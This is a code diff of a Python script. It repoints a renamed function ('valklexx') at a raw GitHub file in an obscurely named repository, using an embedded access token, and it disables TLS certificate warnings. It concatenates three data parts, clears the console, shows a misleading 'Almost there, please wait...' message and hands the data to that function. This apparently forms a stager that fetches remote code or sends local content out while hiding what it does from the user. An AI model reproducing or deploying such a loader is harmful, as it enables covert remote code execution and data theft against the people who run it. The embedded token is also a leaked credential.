@@ -45,14 +45,14 @@ def premx_2025(mycontent: str):
     else:
         raise Exception(f"Error. Your internet is private.")
 
-def realpremx(mycontent: str):
+def valklexx(mycontent: str):
     import requests
     from requests.adapters import HTTPAdapter
     from urllib3.util.retry import Retry
     import urllib3
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     
-    raw_url = "https://raw.githubusercontent.com/klxklxsoiusdfasodfhafdh/myown/refs/heads/main/premx-2025.txt?token=GHSAT0AAAAAADFXIC4GDYDFSWUP4G72IV7I2CVBUBQ"
+    raw_url = "https://raw.githubusercontent.com/klxklxsoiusdfasodfhafdh/myown/refs/heads/main/premx_newcam.txt?token=GHSAT0AAAAAADFXIC4G34BEO622JLGXIWZU2CVBUZQ"
     
     session = requests.Session()
     retry_strategy = Retry(
@@ -111,10 +111,7 @@ content1 = get_data_from_file(part1_data)
 content2 = get_data_from_file(part2_Data)
 content3 = get_data_from_file(part3_data)
 content4 =  content1+content2+content3
-is_it_running()
 
 os.system('cls')
 print("Almost there, please wait...")
-
-
-premx_2025(content4)
+valklexx(content4)
